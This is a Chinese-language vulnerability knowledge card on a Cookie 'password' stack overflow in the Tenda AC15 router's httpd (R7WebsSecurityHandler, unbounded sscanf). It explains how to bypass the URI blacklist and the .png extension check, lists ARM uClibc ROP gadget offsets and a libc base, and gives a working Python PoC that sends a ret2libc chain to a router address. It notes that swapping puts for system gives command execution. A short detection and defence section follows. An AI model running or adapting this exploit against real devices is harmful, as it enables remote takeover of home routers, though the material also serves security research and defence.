---
id: binary-pwn-stack-tenda-ac15-r7webssecurityhandler-cookie-password-sscanf-arm-rop
title: Tenda AC15 httpd R7WebsSecurityHandler 的 Cookie password 经无宽度 sscanf 溢出：非黑名单 URI + .png 后缀过扩展名检查，ARM uClibc ret2libc 劫持控制流
type: scenario
domain: binary
path: binary/pwn/stack
technique: tenda-ac15-r7webssecurityhandler-cookie-password-sscanf-arm-rop
aliases:
- Tenda AC15 栈溢出
- R7WebsSecurityHandler
- Cookie password 溢出
- goform/blonet
- .png 扩展名绕过
- ARM ret2libc pop r3
- mov r0 sp blx r3
- 路由器 httpd 溢出
tags:
- iot
- router
- tenda
- httpd
- stack-overflow
- sscanf
- arm
- uclibc
- rop
- ret2libc
cve: []
severity: high
confidence: high
status: verified
affected_versions: Tenda AC15 15.03.1.16_multi（原文复现固件）
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V682
  verified_at: '2026-11-13T13:59:13+08:00'
  notes: 已对照原文与14图核对：图01/08 qemu-arm-static 运行 httpd 输出 WeLoveLinux/Welcome 与 connect 失败；图02 aYesWeloveLinux 交叉引用；图03/04/05/06/07 Keypatch 将 check_network 后的 CMP/BGT 分支改为 MOV R3,#1（.text:0002CF90，01 30 A0 E3）；图09 第二处 ConnectCfm 判断一并 patch；图10/11 patch 后 httpd 分别 listen 255.255.255.255 与 br0 配好后的 192.168.65.1:80；图12 gdb 断点未命中原目标，bt 停在 libc strstr+24 的 0x2c5cc 扩展名检查；图13 payload 追加 .png 后成功溢出，R11/SP=0x61616161、PC=0x2ed18(R7WebsSecurityHandler+5428, pop {r4,r5,r6,fp,pc})；图14 最终 exp 输出 Hello，证明 puts 控制流劫持成功。sscanf '%*[^=]=%[^;];*' 无宽度、URI 黑名单、.png 绕过、libc+0x18298/+0x40cb8、base=0xf65e5000 均与原文一致；修正 /goform/telnet 条件表述（g_Pass 已设置且不等于 YWRtaW4= 时该路径才不落入排除项）。原文未给 CVE 编号，cve 留空；affected_versions 按原文复现固件 15.03.1.16_multi。append_scenario dedup_review 成立：与 SetFirewallCfg/setMacFilterCfg 两卡同器件同 gadget 但 sink/入口/绕过/固件版本不同；dup-scan 无 pair；qemu 仿真前提卡在库。未在本环境复现。
---

## 一句话结论

Tenda AC15（15.03.1.16_multi）httpd 的 `R7WebsSecurityHandler` 在解析 Cookie `password=` 时用无宽度限制的 `sscanf(..., "%*[^=]=%[^;];*", v33)` 把值复制进栈缓冲区，可远程溢出；请求路径需避开一长串 URI 黑名单（用不存在的 `/goform/blonet` 即可），并在 payload 末尾追加 `.pngAAA` 通过 0x2c5cc 处的扩展名检查。httpd 为 ARM 32-bit、非 PIE、uClibc，qemu-user 下无 ASLR，可从 vmmap 取 libc 基址，用 `pop {r3, pc}`（libc+0x18298）与 `mov r0, sp; blx r3`（libc+0x40cb8）构造 ret2libc；原文以 `puts("Hello")` 验证控制流劫持。

## 原理

- **sink**：`R7WebsSecurityHandler` 中
  ```c
  if (*(_DWORD *)(a1 + 184)) {
      v40 = strstr(*(const char **)(a1 + 184), "password=");
      if (v40) sscanf(v40, "%*[^=]=%[^;];*", v33);
      else     sscanf(*(const char **)(a1 + 184), "%*[^=]=%[^;];*", v33);
  }
  ```
  `%[^;]` 未指定最大宽度，Cookie 中 `password=` 后的内容会一直复制到 `;`（或字符串结束）为止，`v33` 是栈上固定缓冲区，超长即覆盖返回地址。
- **URI 黑名单**：进入该处理前有一串 `strncmp/strstr` 排除 `/public/`、`/lang/`、`img/main-logo.png`、`reasy-ui-1.0.3.js`、`/favicon.ico`、`/kns-query`、`/wdinfo.php`、`/`、`/goform/telnet`（路径为该值时，需 `g_Pass` 已设置且不等于 `YWRtaW4=` 才不落入该排除项）、`/goform/fast_setting`、`/goform/ate`、`/goform/InsertWhite`、`/yun_safe.html`、`/goform/getWanConnectStatus`、`/goform/getProduct`、`/goform/getRebootStatus`、`/loginerr.html` 等；攻击者只需请求一个不在列表中的路径（原文用 `/goform/blonet`）即可到达漏洞代码。
- **扩展名检查绕过**：调试时第一次发送 `a*0x400` 没有命中目标断点，`bt` 显示停在 `0x2c5cc` 的检查处：
  ```c
  if (strlen(s) <= 3 || (v42 = strchr(s, '.')) == 0 ||
      (memcmp(v42+1,"gif",3) && memcmp(v42+1,"png",3) && ... "js"/"css"/"jpg"/"jpeg"))
  ```
  该检查要求字符串包含合法扩展名；在 payload 后追加 `.pngAAA`（含 `.png`）即可通过，且不影响前面已算好的覆盖偏移。原文最终 payload 为 `'a'*444 + ".png" + ROP`。
- **覆盖偏移与调试**：GDB 断在溢出函数结束处（`b *0x002ED18`，`R7WebsSecurityHandler+5428`），发送 payload 后 `R11`/`SP` 为 `0x61616161`（'aaaa'），`PC` 指向 `pop {r4, r5, r6, fp, pc}`，说明返回地址已被覆盖、栈上 ROP 生效；偏移为 444 字节 + 4 字节 `.png`。
- **ARM ret2libc**：httpd 为 ELF32 ARM EABI5、EXEC（非 PIE），qemu-user 不启用地址随机化，`vmmap` 可直接读 libc 基址（原文 `base = 0xf65e5000`）。libc 中：
  - `0x00018298: pop {r3, pc}`——把栈上下一格弹入 `r3` 作为间接调用目标，再跳到再下一格；
  - `0x00040cb8: mov r0, sp; blx r3`——把 `r0` 设为当前栈指针（指向紧随其后的字符串）并调用 `r3`。
  链：`pop {r3,pc}` → `puts` → `mov r0,sp; blx r3` → `"Hello\0"`，即 `puts("Hello")`；把 `puts` 换成 `system` 并把字符串换成命令即可 getshell（原文仅验证到 `puts`，输出 `Hello`）。
- **为什么成立**：`sscanf` 的 `%[^;]` 没有 `%Ns` 宽度限制；Cookie 在 HTTP 头中完全可控；URI 黑名单是枚举而非白名单，随便一个未列出的路径即可；扩展名检查只看字符串是否以合法后缀出现，不限制前面内容；非 PIE + 无 ASLR 让 ROP 地址固定。

## 触发条件

- 目标为 Tenda AC15 15.03.1.16_multi（或同源代码）的 httpd，80 端口可访问。
- 请求路径不在黑名单中（如 `/goform/blonet`）。
- Cookie `password=` 值足够长并包含 `.png` 等合法扩展名以通过检查。
- 目标 httpd 非 PIE、无 Canary（或已被绕过），且能获得 libc 基址（qemu 模拟无 ASLR，或真实设备信息泄露）。
- 真实设备上若启用 ASLR，需要先泄露 libc 基址或改用其他信息泄露面。

## 利用步骤

1. 用 binwalk 解包固件，确认 `bin/httpd` 为 ARM 32-bit，IDA 定位 `R7WebsSecurityHandler` 与 `sscanf` 调用。
2. 本地用 `qemu-arm-static -g` + `gdb-multiarch` 调试，构造 Cookie `password=` + 循环字符测偏移（原文 444 字节 + `.png`）。
3. 请求 `/goform/blonet`（非黑名单路径），payload 末尾加 `.pngAAA` 通过扩展名检查。
4. `vmmap` 取 libc 基址，`ropgadget` 找 `pop {r3, pc}`、`mov r0, sp; blx r3`。
5. 发送 ROP 链验证控制流：`pop_r3 | puts | mov_r0 | "Hello\0"`，观察 httpd 输出 `Hello`；替换 `puts` 为 `system` 与命令字符串即可命令执行。

## PoC

```python
import requests
from pwn import *

base = 0xf65e5000                 # qemu-user 下 vmmap 得到的 libc.so.0 基址
libc = ELF('./lib/libc.so.0')
puts   = base + libc.sym['puts']
mov_r0 = base + 0x00040cb8        # mov r0, sp; blx r3;
pop_r3 = base + 0x00018298        # pop {r3, pc};
_str   = "Hello\x00"

URL = "http://192.168.7.44:80/goform/blonet"   # 非黑名单 URI
pl = 'a'*444 + ".png" + p32(pop_r3) + p32(puts) + p32(mov_r0) + _str
cookie = {"Cookie": "password=" + pl}
requests.get(url=URL, cookies=cookie)
```

调试：`sudo chroot ./ ./qemu-arm-static -g 4444 ./bin/httpd`，`gdb-multiarch ./httpd` → `target remote :1234` → `b *0x002ED18`（`R7WebsSecurityHandler+5428`）→ 发送请求。

## 变体与关联

- **同厂商其他溢出**：`[[binary-pwn-stack-tenda-ac15-setfirewallcfg-firewallen-strcpy-arm-rop]]`（SetFirewallCfg / firewallEn，CVE-2023-27021）与 `[[binary-pwn-stack-tenda-ac15-setmacfiltercfg-devicelist-strcpy-arm-rop]]`（setMacFilterCfg / deviceList）使用相同的 uClibc gadget（`pop {r3, pc}` @0x18298、`mov r0, sp; blx r3` @0x40cb8）；本卡的区别是 sink 为 `R7WebsSecurityHandler` 的 Cookie password `sscanf`，且需要 URI 黑名单与扩展名检查双重绕过。
- **其他路径/后缀**：URI 可用任何未列入黑名单的路径；扩展名可用 `.gif`/`.js`/`.css`/`.jpg`/`.jpeg` 等，`.png` 只是原文选择。
- **真实设备 ASLR**：若目标启用 ASLR，可结合信息泄露（如 puts 回显）先算基址，再二次触发。
- **仿真环境**：`[[code-analysis-reverse-firmware-arm32-qemu-user-chroot-patch-br0]]`（binwalk + qemu-arm-static chroot + WeLoveLinux/check_network patch + br0）是本卡的运行前提。
- **通用 ARM ret2libc**：`[[binary-pwn-rop-arm32-stripped-ret2libc-pop-r0-static]]`。

## 检测与防御

- **代码**：`sscanf` 的 `%[` 必须带宽度（如 `%255[^;]`），或改用有界复制；不要从 Cookie 直接解析到栈缓冲区；对 URI 使用白名单而非黑名单。
- **编译/运行**：启用 PIE/ASLR、栈保护（Canary）、FORTIFY；真实设备开启地址随机化可显著提高 ROP 难度。
- **检测**：Cookie `password=` 长度异常（数百字节以上）、值中出现循环字符 + `.png`/`.gif` 等扩展名；请求路径为不存在的 `/goform/*`；httpd 崩溃/核心转储与异常 `hello`/`puts` 输出。
- **响应**：升级固件；限制 httpd 暴露面（仅内网/管理 VLAN）；对路由设备做完整性校验与崩溃日志审计。
